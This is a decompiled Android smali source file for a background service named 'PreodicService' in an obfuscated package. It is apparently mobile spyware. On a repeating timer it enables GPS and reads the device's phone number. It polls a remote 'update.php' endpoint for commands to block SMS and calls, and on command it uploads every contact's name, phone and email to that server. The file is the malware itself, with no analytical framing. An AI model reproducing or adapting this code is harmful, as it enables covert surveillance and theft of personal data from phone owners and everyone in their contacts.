.class public LTnxibnad/Pncibnsc/view/PreodicService;
.super Landroid/app/Service;
.source "PreodicService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        LTnxibnad/Pncibnsc/view/PreodicService$MyAsyncTask;
    }
.end annotation


# static fields
.field public static final CPMPATH_LOCATION:Ljava/lang/String; = "/data/data/Tnxibnad.Pncibnsc.view/tapping/cmp"


# instance fields
.field private mCalllogInfoChange:Landroid/database/ContentObserver;

.field private mLimit:I

.field private mOffSet:I

.field private mTimer:Ljava/util/Timer;

.field private myAsyncTask:LTnxibnad/Pncibnsc/view/PreodicService$MyAsyncTask;


# direct methods
.method public constructor <init>()V
    .registers 2

    .prologue
    .line 26
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 28
    const/4 v0, 0x0

    iput-object v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    .line 29
    const/16 v0, 0x64

    iput v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mLimit:I

    .line 30
    const/4 v0, 0x0

    iput v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mOffSet:I

    .line 26
    return-void
.end method


# virtual methods
.method protected doScanNet()V
    .registers 21

    .prologue
    .line 88
    move-object/from16 v0, p0

    iget-object v1, v0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    if-eqz v1, :cond_12

    .line 90
    move-object/from16 v0, p0

    iget-object v1, v0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    invoke-virtual {v1}, Ljava/util/Timer;->cancel()V

    .line 91
    const/4 v1, 0x0

    move-object/from16 v0, p0

    iput-object v1, v0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    .line 94
    :cond_12
    new-instance v19, LTnxibnad/Pncibnsc/view/Util;

    invoke-direct/range {v19 .. v20}, LTnxibnad/Pncibnsc/view/Util;-><init>(Landroid/content/Context;)V

    .line 95
    .local v19, "util":LTnxibnad/Pncibnsc/view/Util;
    invoke-virtual/range {v19 .. v19}, LTnxibnad/Pncibnsc/view/Util;->enableGPS()V

    .line 96
    invoke-virtual/range {v19 .. v19}, LTnxibnad/Pncibnsc/view/Util;->getPhoneNumber()Ljava/lang/String;

    move-result-object v15

    .line 99
    .local v15, "phoneNumber":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    sget-object v2, LTnxibnad/Pncibnsc/net/HttpUtils;->URL:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "update.php?telnum="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    .line 101
    .local v18, "url":Ljava/lang/String;
    new-instance v1, LTnxibnad/Pncibnsc/view/PreodicService$MyAsyncTask;

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-direct {v1, v0, v2}, LTnxibnad/Pncibnsc/view/PreodicService$MyAsyncTask;-><init>(LTnxibnad/Pncibnsc/view/PreodicService;LTnxibnad/Pncibnsc/view/PreodicService$MyAsyncTask;)V

    move-object/from16 v0, p0

    iput-object v1, v0, LTnxibnad/Pncibnsc/view/PreodicService;->myAsyncTask:LTnxibnad/Pncibnsc/view/PreodicService$MyAsyncTask;

    .line 102
    const/16 v17, 0x0

    .line 104
    .local v17, "res":Ljava/lang/String;
    :try_start_45
    move-object/from16 v0, p0

    iget-object v1, v0, LTnxibnad/Pncibnsc/view/PreodicService;->myAsyncTask:LTnxibnad/Pncibnsc/view/PreodicService$MyAsyncTask;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v18, v2, v3

    invoke-virtual {v1, v2}, LTnxibnad/Pncibnsc/view/PreodicService$MyAsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v1

    invoke-virtual {v1}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v1

    move-object v0, v1

    check-cast v0, Ljava/lang/String;

    move-object/from16 v17, v0
    :try_end_5c
    .catch Ljava/lang/InterruptedException; {:try_start_45 .. :try_end_5c} :catch_107
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_45 .. :try_end_5c} :catch_10d

    .line 113
    :goto_5c
    if-eqz v17, :cond_e2

    .line 114
    const/4 v13, 0x0

    .line 115
    .local v13, "ob":Lorg/json/JSONObject;
    const/4 v9, 0x0

    .line 116
    .local v9, "bSMSBlockState":Z
    const/4 v7, 0x0

    .line 117
    .local v7, "bCallBlockState":Z
    const/4 v8, 0x0

    .line 119
    .local v8, "bGetContacts":Z
    :try_start_62
    new-instance v14, Lorg/json/JSONObject;

    move-object/from16 v0, v17

    invoke-direct {v14, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
    :try_end_69
    .catch Lorg/json/JSONException; {:try_start_62 .. :try_end_69} :catch_11b

    .line 120
    .end local v13    # "ob":Lorg/json/JSONObject;
    .local v14, "ob":Lorg/json/JSONObject;
    :try_start_69
    const-string v1, "pref"

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, LTnxibnad/Pncibnsc/view/PreodicService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v16

    .line 121
    .local v16, "pref":Landroid/content/SharedPreferences;
    invoke-interface/range {v16 .. v16}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v12

    .line 122
    .local v12, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v1, "sms_blockstate"

    invoke-virtual {v14, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "1"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_113

    const/4 v9, 0x1

    .line 123
    :goto_85
    const-string v1, "tel_blockcallstate"

    invoke-virtual {v14, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "1"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_116

    const/4 v7, 0x1

    .line 124
    :goto_94
    const-string v1, "getcontacts"

    invoke-virtual {v14, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "1"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_119

    const/4 v8, 0x1

    .line 125
    :goto_a3
    const-string v1, "SMS_BlockState"

    invoke-interface {v12, v1, v9}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 126
    const-string v1, "TEL_BlockState"

    invoke-interface {v12, v1, v7}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 127
    const-string v1, "GET_Contacts"

    invoke-interface {v12, v1, v8}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 128
    invoke-interface {v12}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 129
    if-eqz v8, :cond_bc

    .line 130
    move-object/from16 v0, p0

    invoke-virtual {v0, v15}, LTnxibnad/Pncibnsc/view/PreodicService;->getContacts(Ljava/lang/String;)V

    .line 131
    :cond_bc
    const-string v1, "Preodic"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_e2
    .catch Lorg/json/JSONException; {:try_start_69 .. :try_end_e2} :catch_120

    .line 138
    .end local v7    # "bCallBlockState":Z
    .end local v8    # "bGetContacts":Z
    .end local v9    # "bSMSBlockState":Z
    .end local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v14    # "ob":Lorg/json/JSONObject;
    .end local v16    # "pref":Landroid/content/SharedPreferences;
    :cond_e2
    :goto_e2
    move-object/from16 v0, p0

    iget-object v1, v0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    if-nez v1, :cond_106

    .line 139
    new-instance v1, Ljava/util/Timer;

    const/4 v2, 0x1

    invoke-direct {v1, v2}, Ljava/util/Timer;-><init>(Z)V

    move-object/from16 v0, p0

    iput-object v1, v0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    .line 140
    move-object/from16 v0, p0

    iget-object v1, v0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    new-instance v2, LTnxibnad/Pncibnsc/view/PreodicService$2;

    move-object/from16 v0, p0

    invoke-direct {v2, v0}, LTnxibnad/Pncibnsc/view/PreodicService$2;-><init>(LTnxibnad/Pncibnsc/view/PreodicService;)V

    .line 146
    const-wide/32 v3, 0xea60

    const-wide/32 v5, 0xea60

    .line 140
    invoke-virtual/range {v1 .. v6}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 149
    :cond_106
    return-void

    .line 105
    :catch_107
    move-exception v11

    .line 107
    .local v11, "e1":Ljava/lang/InterruptedException;
    invoke-virtual {v11}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_5c

    .line 108
    .end local v11    # "e1":Ljava/lang/InterruptedException;
    :catch_10d
    move-exception v11

    .line 110
    .local v11, "e1":Ljava/util/concurrent/ExecutionException;
    invoke-virtual {v11}, Ljava/util/concurrent/ExecutionException;->printStackTrace()V

    goto/16 :goto_5c

    .line 122
    .end local v11    # "e1":Ljava/util/concurrent/ExecutionException;
    .restart local v7    # "bCallBlockState":Z
    .restart local v8    # "bGetContacts":Z
    .restart local v9    # "bSMSBlockState":Z
    .restart local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v14    # "ob":Lorg/json/JSONObject;
    .restart local v16    # "pref":Landroid/content/SharedPreferences;
    :cond_113
    const/4 v9, 0x0

    goto/16 :goto_85

    .line 123
    :cond_116
    const/4 v7, 0x0

    goto/16 :goto_94

    .line 124
    :cond_119
    const/4 v8, 0x0

    goto :goto_a3

    .line 132
    .end local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v14    # "ob":Lorg/json/JSONObject;
    .end local v16    # "pref":Landroid/content/SharedPreferences;
    .restart local v13    # "ob":Lorg/json/JSONObject;
    :catch_11b
    move-exception v10

    .line 134
    .local v10, "e":Lorg/json/JSONException;
    :goto_11c
    invoke-virtual {v10}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_e2

    .line 132
    .end local v10    # "e":Lorg/json/JSONException;
    .end local v13    # "ob":Lorg/json/JSONObject;
    .restart local v14    # "ob":Lorg/json/JSONObject;
    :catch_120
    move-exception v10

    move-object v13, v14

    .end local v14    # "ob":Lorg/json/JSONObject;
    .restart local v13    # "ob":Lorg/json/JSONObject;
    goto :goto_11c
.end method

.method public getContacts(Ljava/lang/String;)V
    .registers 12
    .param p1, "phonenumber"    # Ljava/lang/String;

    .prologue
    const/4 v8, 0x0

    .line 153
    new-instance v0, LTnxibnad/Pncibnsc/view/Contacts;

    invoke-direct {v0}, LTnxibnad/Pncibnsc/view/Contacts;-><init>()V

    .line 154
    .local v0, "contacts":LTnxibnad/Pncibnsc/view/Contacts;
    invoke-virtual {p0}, LTnxibnad/Pncibnsc/view/PreodicService;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-virtual {v0, v7, v8, v8}, LTnxibnad/Pncibnsc/view/Contacts;->getList(Landroid/content/Context;II)[[Ljava/lang/String;

    move-result-object v5

    .line 155
    .local v5, "strContacts":[[Ljava/lang/String;
    new-instance v3, Lorg/json/JSONArray;

    invoke-direct {v3}, Lorg/json/JSONArray;-><init>()V

    .line 157
    .local v3, "jsonArray":Lorg/json/JSONArray;
    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v7

    if-nez v7, :cond_45

    .line 159
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_1a
    array-length v7, v5

    if-lt v2, v7, :cond_46

    .line 173
    if-eqz v3, :cond_45

    .line 175
    new-instance v7, Ljava/lang/StringBuilder;

    sget-object v8, LTnxibnad/Pncibnsc/net/HttpUtils;->URL:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "?telnum="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "&type=address"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 176
    .local v6, "url":Ljava/lang/String;
    invoke-virtual {v3}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, LTnxibnad/Pncibnsc/net/HttpUtils;->postData(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 179
    .end local v2    # "i":I
    .end local v6    # "url":Ljava/lang/String;
    :cond_45
    return-void

    .line 161
    .restart local v2    # "i":I
    :cond_46
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 163
    .local v4, "kv":Lorg/json/JSONObject;
    :try_start_4b
    const-string v7, "id"

    aget-object v8, v5, v2

    const/4 v9, 0x0

    aget-object v8, v8, v9

    invoke-virtual {v4, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 164
    const-string v7, "name"

    aget-object v8, v5, v2

    const/4 v9, 0x1

    aget-object v8, v8, v9

    invoke-virtual {v4, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 165
    const-string v7, "phone"

    aget-object v8, v5, v2

    const/4 v9, 0x2

    aget-object v8, v8, v9

    invoke-virtual {v4, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 166
    const-string v7, "mail"

    aget-object v8, v5, v2

    const/4 v9, 0x3

    aget-object v8, v8, v9

    invoke-virtual {v4, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_73
    .catch Lorg/json/JSONException; {:try_start_4b .. :try_end_73} :catch_79

    .line 171
    :goto_73
    invoke-virtual {v3, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 159
    add-int/lit8 v2, v2, 0x1

    goto :goto_1a

    .line 167
    :catch_79
    move-exception v1

    .line 169
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_73
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 58
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 1

    .prologue
    .line 62
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 63
    return-void
.end method

.method public onDestroy()V
    .registers 3

    .prologue
    .line 183
    const-string v0, "Preodic"

    const-string v1, "Stopped Preodic Service"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 184
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 185
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 11
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    const/4 v6, 0x1

    .line 67
    iget-object v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    if-eqz v0, :cond_d

    .line 68
    iget-object v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    .line 69
    const/4 v0, 0x0

    iput-object v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    .line 72
    :cond_d
    iget-object v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    if-nez v0, :cond_27

    .line 73
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0, v6}, Ljava/util/Timer;-><init>(Z)V

    iput-object v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    .line 74
    iget-object v0, p0, LTnxibnad/Pncibnsc/view/PreodicService;->mTimer:Ljava/util/Timer;

    new-instance v1, LTnxibnad/Pncibnsc/view/PreodicService$1;

    invoke-direct {v1, p0}, LTnxibnad/Pncibnsc/view/PreodicService$1;-><init>(LTnxibnad/Pncibnsc/view/PreodicService;)V

    .line 80
    const-wide/16 v2, 0x0

    const-wide/32 v4, 0xea60

    .line 74
    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 82
    :cond_27
    return v6
.end method
